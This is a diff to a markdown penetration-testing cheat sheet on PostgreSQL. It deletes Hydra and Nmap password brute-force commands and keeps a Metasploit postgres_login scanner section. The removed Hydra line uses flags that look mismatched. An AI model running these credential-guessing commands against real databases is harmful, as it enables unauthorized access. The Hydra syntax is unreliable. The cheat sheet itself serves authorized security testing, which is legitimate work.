@@ -1,10 +1,4 @@
-# PostgreSQL
-
-## 01 - Hydra
-
-`$ hydra -u <username> -l passwords.lst <IP> postgres`
-
-## 02 - Metasploit
+# Metasploit
 
 ```
 msf > use auxiliary/scanner/postgres/postgres_login
@@ -48,12 +42,3 @@ msf auxiliary(scanner/postgres/postgres_login) > set bruteforce_speed [0-5]
 
 msf auxiliary(scanner/postgres/postgres_login) > run -j
 ```
-
-## 03 - Nmap
-
-`$ nmap -p 5432 --script pgsql-brute --script-args userdb=users.lst,passdb=passwords.lst <IP>`
-
----
-## References
-
-- [Pentration Testing on PostgreSQL 5432](https://www.hackingarticles.in/penetration-testing-on-postgresql-5432/)
